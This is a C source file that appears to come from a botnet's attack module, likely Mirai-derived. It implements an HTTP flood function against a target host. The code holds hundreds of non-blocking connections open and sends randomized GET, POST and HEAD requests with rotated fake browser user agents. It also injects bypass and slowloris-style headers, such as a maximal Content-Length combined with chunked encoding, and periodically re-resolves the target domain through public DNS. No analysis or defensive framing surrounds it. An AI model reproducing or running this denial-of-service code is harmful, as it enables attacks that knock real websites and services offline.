#define _GNU_SOURCE
#include <stdlib.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "protocol.h"
#include "tls.h"
extern ipv4_t get_dns_resolver(void);
extern ipv4_t resolve_domain_with_server(char *domain, ipv4_t dns_server);
extern ipv4_t get_dns_resolver(void);


void attack_method_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_HTTP_PATH, "/");
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char host[256];
    ipv4_t target_ip = targs[0].addr;
    char target_ip_str[16];
    struct sockaddr_in addr;
    struct timeval timeout = {2, 0};
    int sockets[256];
    int active = 0;
    time_t start = time(NULL);
    uint32_t method_sel = (uint32_t)attack_get_opt_int(opts_len, opts, ATK_OPT_HTTP_METHOD, 0xffff);
    int tls_enabled = attack_get_opt_int(opts_len, opts, ATK_OPT_TLS, 0);
    int has_domain = domain && util_strlen(domain) > 0 && util_strlen(domain) < 255;
    int resolve_counter = 0;

    util_memcpy(target_ip_str, inet_ntoa(*(struct in_addr *)&target_ip), 16);
    target_ip_str[15] = 0;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = target_ip;
    if (has_domain)
        util_strcpy(host, domain);
    else
        util_strcpy(host, target_ip_str);

    while (TRUE)
    {
        if (has_domain && (resolve_counter++ % 10) == 0)
        {
            ipv4_t dns_servers[] = {
                INET_ADDR(8,8,8,8),
                INET_ADDR(8,8,4,4),
                INET_ADDR(1,1,1,1),
                INET_ADDR(9,9,9,9),
            };
            ipv4_t resolved = resolve_domain_with_server(domain, dns_servers[rand_next() % 4]);
            if (resolved != 0)
            {
                target_ip = resolved;
                addr.sin_addr.s_addr = resolved;
                util_memcpy(target_ip_str, inet_ntoa(*(struct in_addr *)&resolved), 16);
                target_ip_str[15] = 0;
            }
        }

        while (active < 256)
        {
            int s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) break;
            fcntl(s, F_SETFL, O_NONBLOCK | fcntl(s, F_GETFL, 0));
            addr.sin_port = htons(dport == 0xffff ? (rand_next() & 0xffff) : dport);
            connect(s, (struct sockaddr *)&addr, sizeof(addr));
            if (tls_enabled)
                tls_connect(s, host, 1);
            sockets[active++] = s;
        }
        for (i = 0; i < active; i++)
        {
            int s = sockets[i];
            char req[1024];
            char *ua;
            int req_len;
            char method[8];
            int m = method_sel == 0xffff ? (rand_next() % 3) : (method_sel % 3);

            if (m == 0) util_strcpy(method, "GET");
            else if (m == 1) util_strcpy(method, "POST");
            else util_strcpy(method, "HEAD");

            {
                static const char *uas[] = {
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                };
                ua = (char *)uas[rand_next() % 5];
            }
            req_len = util_strcpy(req, method);
            req[req_len++] = ' ';
            req_len += util_strcpy(req + req_len, path);
            req_len += util_strcpy(req + req_len, " HTTP/1.1\r\nHost: ");
            req_len += util_strcpy(req + req_len, host);
            req_len += util_strcpy(req + req_len, "\r\nUser-Agent: ");
            req_len += util_strcpy(req + req_len, ua);

            /* randomly inject bypass/slowloris-style headers */
            {
                int r = rand_next() % 5;
                if (r == 0)
                {
                    req_len += util_strcpy(req + req_len, "\r\nContent-Length: 2147483647");
                    req_len += util_strcpy(req + req_len, "\r\nTransfer-Encoding: chunked");
                }
                else if (r == 1)
                {
                    req_len += util_strcpy(req + req_len, "\r\nConnection: Upgrade");
                    req_len += util_strcpy(req + req_len, "\r\nUpgrade: websocket");
                    req_len += util_strcpy(req + req_len, "\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==");
                    req_len += util_strcpy(req + req_len, "\r\nSec-WebSocket-Version: 13");
                }
                else if (r == 2)
                {
                    req_len += util_strcpy(req + req_len, "\r\nX-Requested-With: XMLHttpRequest");
                    req_len += util_strcpy(req + req_len, "\r\nProxy-Authorization: Basic ");
                    req_len += util_strcpy(req + req_len, "dXNlcjpwYXNz");
                }
                else
                {
                    req_len += util_strcpy(req + req_len, "\r\nCache-Control: no-cache, no-store");
                    req_len += util_strcpy(req + req_len, "\r\nAccept-Language: en-US,en;q=0.9,en-GB;q=0.8");
                    req_len += util_strcpy(req + req_len, "\r\nPragma: no-cache");
                }
            }

            req_len += util_strcpy(req + req_len, "\r\nAccept: text/html,application/xhtml+xml,*/*\r\nAccept-Encoding: gzip, deflate\r\n\r\n");
            if (m == 1)
            {
                req_len += util_strcpy(req + req_len, "data=1&rand=");
                util_itoa(rand_next(), 16, req + req_len);
                req_len += util_strlen(req + req_len);
            }
            if (tls_enabled)
                tls_write(s, req, req_len);
            else
                send(s, req, req_len, MSG_NOSIGNAL);
        }
        {
            int j;
            for (j = 0; j < active; j++)
            {
                if (sockets[j] <= 0) continue;
                {
                    fd_set fds;
                    struct timeval tv = {0, 0};
                    FD_ZERO(&fds);
                    FD_SET(sockets[j], &fds);
                    if (select(sockets[j] + 1, &fds, NULL, NULL, &tv) > 0)
                    {
                        char buf[1024];
                        if (recv(sockets[j], buf, sizeof(buf), MSG_DONTWAIT) <= 0)
                        {
                            close(sockets[j]);
                            sockets[j] = sockets[--active];
                            sockets[active] = 0;
                            j--;
                        }
                    }
                }
            }
        }
        if (time(NULL) - start > attack_get_opt_int(opts_len, opts, ATK_OPT_TIME, 0xffff))
            break;
    }
    for (i = 0; i < active; i++)
        if (sockets[i] > 0) close(sockets[i]);
}

